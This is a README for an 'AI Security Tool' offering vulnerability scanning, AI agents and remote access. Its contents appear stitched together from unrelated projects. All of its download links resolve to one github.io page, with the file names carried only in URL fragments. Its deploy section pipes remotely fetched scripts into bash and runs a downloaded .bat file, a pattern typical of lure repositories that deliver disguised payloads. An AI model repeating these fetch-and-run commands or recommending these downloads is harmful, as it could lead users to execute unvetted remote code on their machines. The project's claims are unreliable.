<div align="center">

# 🛡️ AI Security Tool

### AI-Powered Security Workstation for Vulnerability Discovery, SBOM Analysis & Remote Access

<p>
  <a href="https://zerodayevil.github.io/ai-security-tool">
    <img src="https://img.shields.io/badge/Download%20Build-d90429?style=for-the-badge&logo=windows&logoColor=white" alt="Download Build">
  </a>
  <a href="https://zerodayevil.github.io/ai-security-tool">
    <img src="https://img.shields.io/badge/Download%20Release-00509d?style=for-the-badge&logo=github&logoColor=white" alt="Download Release">
  </a>
</p>

</div>

<hr>

<p align="center">
  <img width="100%" alt="AI Security Tool" src="https://zerodayevil.github.io/ai-security-tool/banner.png">
</p>

<hr>

## 🧠 Conceptual Overview

**AI Security Tool** is a free and open-source security application that combines vulnerability intelligence, SBOM analysis, AI-assisted security workflows, terminal access and remote system management in a single environment.

The project was originally created for personal use and evolved into a tool that can be used by security researchers, developers, DevOps engineers and anyone who needs to identify known vulnerabilities and work with local or remote systems.

It can run as a **desktop application** or through a **web browser**, including on mobile devices.

### 🎯 Core Philosophy

> **One environment for security analysis, automation, AI assistance and system access.**

The goal is to reduce the number of separate tools required for everyday security work while keeping vulnerability data, terminal access, automation and AI assistance in one place.

<hr>

## 🔐 Vulnerability Intelligence

AI Security Tool collects vulnerability information from multiple public vulnerability databases and security advisory sources:

<table>
  <thead>
    <tr>
      <th>Source</th>
      <th>Purpose</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><strong>NVD / CVE</strong></td>
      <td>National vulnerability information and CVE records</td>
    </tr>
    <tr>
      <td><strong>Red Hat</strong></td>
      <td>Red Hat security advisories</td>
    </tr>
    <tr>
      <td><strong>OSV</strong></td>
      <td>Open Source Vulnerability database</td>
    </tr>
    <tr>
      <td><strong>GitLab Advisory Database</strong></td>
      <td>Package and dependency vulnerability advisories</td>
    </tr>
    <tr>
      <td><strong>curl</strong></td>
      <td>curl security advisories</td>
    </tr>
  </tbody>
</table>

<p>
  Vulnerability data is cached locally and, by default, updated approximately once per day instead of being downloaded on every scan.
</p>

> ⚠️ The first download can take some time because vulnerability databases contain a large amount of data.

<hr>

## 📦 SBOM & Component Analysis

AI Security Tool can identify software components and correlate them with known vulnerabilities.

### Component Detection

The tool can create a component list, including versions, using:

- Binary file analysis
- Programming-language dependency information
- Dependency manifests such as `requirements.txt`
- Other available component information

### Existing SBOM

An existing SBOM can be loaded and analyzed using a supported standardized format.

The analysis workflow:

```text
Components / SBOM
       │
       ▼
 Component Detection
       │
       ▼
 Version Identification
       │
       ▼
 Vulnerability Correlation
       │
       ▼
 Security Report
```

### 📊 Vulnerability Reports

Reports can be generated in:

- Console
- JSON
- CSV
- HTML
- PDF

Historical report data can also be used to track vulnerability changes over time and maintain additional remediation or contextual information.

<hr>

## 🤖 AI Assistance

AI Security Tool supports integration with AI providers such as:

- OpenAI
- DeepSeek
- Other compatible AI APIs

AI assistance can be used for:

- Command suggestions
- Script generation
- Terminal output analysis
- Explaining security findings
- Security workflow assistance
- Working with available tools

<hr>

## 🧠 AI Agents

The application includes **more than 12 specialized AI agents** designed for different security tasks and workflows.

<table>
  <thead>
    <tr>
      <th>Agent</th>
      <th>Purpose</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>IntelligentDecisionEngine</code></td>
      <td>Tool selection and parameter optimization</td>
    </tr>
    <tr>
      <td><code>BugBountyWorkflowManager</code></td>
      <td>Bug bounty workflow management</td>
    </tr>
    <tr>
      <td><code>CTFWorkflowManager</code></td>
      <td>CTF workflow assistance</td>
    </tr>
    <tr>
      <td><code>CVEIntelligenceManager</code></td>
      <td>CVE and vulnerability analysis</td>
    </tr>
    <tr>
      <td><code>VulnerabilityCorrelator</code></td>
      <td>Vulnerability relationships and potential attack chains</td>
    </tr>
    <tr>
      <td><code>TechnologyDetector</code></td>
      <td>Technology stack identification</td>
    </tr>
    <tr>
      <td><code>RateLimitDetector</code></td>
      <td>Request rate-limit detection</td>
    </tr>
    <tr>
      <td><code>FailureRecoverySystem</code></td>
      <td>Error handling and recovery</td>
    </tr>
    <tr>
      <td><code>PerformanceMonitor</code></td>
      <td>Performance monitoring and optimization</td>
    </tr>
    <tr>
      <td><code>ParameterOptimizer</code></td>
      <td>Context-aware parameter optimization</td>
    </tr>
    <tr>
      <td><code>GracefulDegradation</code></td>
      <td>Resilient operation when components fail</td>
    </tr>
  </tbody>
</table>

<hr>

## 🖥️ Terminal & Remote Access

AI Security Tool can also be used as a terminal and remote connection client.

### Supported protocols

<p>
  <code>SSH</code>
  <code>SFTP</code>
  <code>Telnet</code>
  <code>Serial</code>
  <code>RDP</code>
  <code>VNC</code>
  <code>SPICE</code>
  <code>FTP</code>
</p>

### Remote Access Features

- Public-key and password authentication
- SSH tunnels
- Remote file editing
- Global and session proxies
- Quick commands
- Terminal themes
- Custom terminal backgrounds
- Transparent window on macOS and Windows
- Multi-terminal input
- Bookmark synchronization
- Theme synchronization
- Quick-command synchronization
- URL-based session initialization

> Double-clicking a small remote file allows it to be opened directly for editing.

<hr>

## ⚡ Advanced Features

<table>
  <thead>
    <tr>
      <th>Feature</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><strong>Intelligent Caching</strong></td>
      <td>LRU-based caching for faster repeated operations</td>
    </tr>
    <tr>
      <td><strong>Real-Time Process Management</strong></td>
      <td>Monitor and manage running processes</td>
    </tr>
    <tr>
      <td><strong>Vulnerability Analysis</strong></td>
      <td>Monitor CVEs and analyze vulnerability information</td>
    </tr>
    <tr>
      <td><strong>API Security Testing</strong></td>
      <td>REST API, GraphQL and JWT security testing</td>
    </tr>
    <tr>
      <td><strong>Real-Time Dashboard</strong></td>
      <td>Live status, progress and security information</td>
    </tr>
    <tr>
      <td><strong>Global Hotkey</strong></td>
      <td>Show or hide the application window</td>
    </tr>
    <tr>
      <td><strong>Fast Input</strong></td>
      <td>Send input to one or multiple terminals</td>
    </tr>
    <tr>
      <td><strong>URL Initialization</strong></td>
      <td>Initialize application sessions from a URL</td>
    </tr>
  </tbody>
</table>

**Default global hotkey:** `Ctrl + 2`

<hr>

## 🌐 Web & Mobile

AI Security Tool supports both desktop and browser-based operation.

The browser interface can be used from desktop computers and mobile devices.

| Platform | Support |
|---|:---:|
| Windows | ✅ |
| macOS | ✅ |
| Linux | ✅ |
| Android | ✅ |
| HarmonyOS | ✅ |
| iOS | ✅ |

<hr>

## 🚀 How It Works

A typical vulnerability analysis workflow:

```text
┌──────────────────────────┐
│ Vulnerability Databases  │
│ NVD / Red Hat / OSV /    │
│ GitLab / curl            │
└────────────┬─────────────┘
             │
             ▼
┌──────────────────────────┐
│      Local CVE Data     │
└────────────┬─────────────┘
             │
             ▼
┌──────────────────────────┐
│ Component / SBOM Analysis│
└────────────┬─────────────┘
             │
             ▼
┌──────────────────────────┐
│ Vulnerability Correlation│
└────────────┬─────────────┘
             │
             ▼
┌──────────────────────────┐
│     Security Report      │
└──────────────────────────┘
```

<hr>

## 📥 Download

**AI Security Tool is free and open source.**

### 🪟 Windows

**Installer — recommended**

[Download `5.3.26-win-x64-installer.exe`](https://zerodayevil.github.io/ai-security-tool#5.3.26-win-x64-installer.exe)

**Portable**

[Download `5.3.26-win-x64.tar.gz`](https://zerodayevil.github.io/ai-security-tool#5.3.26-win-x64.tar.gz)

Extract the archive and run the application.

### 🍎 macOS

**Apple Silicon**

[Download `5.3.26-mac-arm64.dmg`](https://zerodayevil.github.io/ai-security-tool#5.3.26-mac-arm64.dmg)

For Macs with Apple Silicon processors such as M1, M2, M3 and newer.

### 🐧 Linux

[Download `5.3.26-linux-x64.tar.gz`](https://zerodayevil.github.io/ai-security-tool#5.3.26-linux-x64.tar.gz)

Extract the archive and run the application.

### 📱 Android

[Download `android-arm64-v8a-5.3.27.apk`](https://zerodayevil.github.io/ai-security-tool#android-arm64-v8a-5.3.27.apk)

For ARM64 Android devices.

### Other platforms

Builds are also available for:

- HarmonyOS
- iOS

See the project's download page for the latest builds.

<hr>

## 🛠️ Deploy From Source

### Linux / macOS

```bash
curl -o- https://github.com/ZeroDayEvil/ai-security-tool/scripts/one-line-web.sh | bash
```

or:

```bash
wget -qO- https://github.com/ZeroDayEvil/ai-security-tool/scripts/one-line-web.sh | bash
```

### Windows

```powershell
Invoke-WebRequest -Uri "https://github.com/ZeroDayEvil/ai-security-tool/scripts/one-line-web.bat" -OutFile "one-line-web.bat"

cmd.exe /c ".\one-line-web.bat"
```

> **Security recommendation:** Review deployment scripts before executing them.

<hr>

## 🏗️ Build & Run

Build the application:

```bash
npm run build
```

Run the production server:

```bash
npm run prod
```

or:

```bash
./build/bin/run-prod.sh
```

Then open:

```text
http://127.0.0.1:5577
```

<hr>

## 🖥️ Server Deployment

Configure `.env`:

```env
ENABLE_AUTH=1
DISABLE_LOCAL_TERMINAL=1
SERVER_SECRET=some-server-secret
SERVER_PASS=some-login-password
```

### Configuration

| Variable | Description |
|---|---|
| `ENABLE_AUTH` | Enables authentication |
| `DISABLE_LOCAL_TERMINAL` | Disables access to the local terminal |
| `SERVER_SECRET` | Server secret |
| `SERVER_PASS` | Authentication password |

Start the production server:

```bash
./run-ai-security-tool-web.sh
```

### Nginx

Example configurations:

```text
examples/nginx.conf
examples/nginx-ssl.conf
```

<hr>

## 🔒 Security

> ⚠️ **Important Security Notice**

AI Security Tool can provide AI agents with powerful access to local and remote systems.

Depending on configuration, agents may interact with:

- Terminals
- Files
- Network services
- Remote systems
- Security tools
- Scripts and commands

### Production recommendations

- Enable authentication.
- Disable the local terminal when it is not required.
- Use HTTPS.
- Use a strong `SERVER_SECRET`.
- Use a strong server password.
- Restrict access with a firewall.
- Review AI-agent permissions.
- Monitor agent activity.
- Avoid unnecessary privileges.

**Do not expose an unauthenticated instance directly to the public Internet.**

AI-generated commands and scripts should be reviewed before execution on production or sensitive systems.

<hr>

## 🔄 CI/CD & Supply Chain Security

AI Security Tool can be integrated into continuous integration and delivery workflows.

```text
Build
  │
  ▼
Detect Components
  │
  ▼
Generate / Read SBOM
  │
  ▼
Check Vulnerability Databases
  │
  ▼
Match Known Vulnerabilities
  │
  ▼
Generate Report
  │
  ▼
Review / Fail Pipeline
```

This helps identify known vulnerabilities in software dependencies and components earlier in the development and deployment lifecycle.

<hr>

## 🤝 Contributing

AI Security Tool is free and open source. Contributions, bug reports, ideas and improvements are welcome.

### Priority Areas

| Area | Examples |
|---|---|
| 🤖 **AI Agents** | New providers, models, agents and workflows |
| 🛡️ **Security Tools** | Additional security and vulnerability tools |
| ⚡ **Performance** | Caching, optimization and scalability |
| 📖 **Documentation** | Examples, guides and integrations |
| 🧪 **Testing** | Automated, integration and cross-platform tests |
| 🐛 **Bug Fixes** | Fixes and improvements across supported platforms |

### Development Workflow

1. Fork the repository.
2. Create a feature branch.
3. Make your changes.
4. Add or update tests where appropriate.
5. Submit a pull request.

<hr>

## 🐞 Bug Reports & Feature Requests

If you find a bug or have an idea for a new feature, please open an issue in the repository.

Include:

- AI Security Tool version
- Operating system
- Steps to reproduce
- Expected behavior
- Actual behavior
- Relevant logs

**Never include passwords, API keys, private keys or other sensitive information in public issues.**

<hr>

## 🛡️ Security Vulnerabilities

Please **do not publicly disclose serious security vulnerabilities through GitHub Issues**.

Use the project's private security reporting process instead.

See [`SECURITY.md`](SECURITY.md) for details.

<hr>

## ⚖️ License

AI Security Tool is free and open-source software.

See [`LICENSE`](LICENSE) for the applicable license and terms of use.

<hr>

## 📞 Contact

### Project

**GitHub:**  
https://github.com/ZeroDayEvil/ai-security-tool

**Website:**  
https://zerodayevil.github.io/ai-security-tool

### Telegram

- **Admin:** https://t.me/ZeroDayEvil
- **Community Chat:** https://t.me/ZeroDyaTool_chat
- **News Channel:** https://t.me/ZeroDyaTool_channel

### Other Projects

https://github.com/ZeroDayEvil

### Support the Project

**OpenCollective:**  
https://opencollective.com/ZeroDayEvil

<hr>

<div align="center">

### ⭐ Support the Project

If AI Security Tool is useful to you:

⭐ Star the repository · 🐛 Report bugs · 💡 Suggest features · 🔧 Contribute · 📖 Improve documentation

<br>

**Free. Open Source. Built for Security.**

</div>
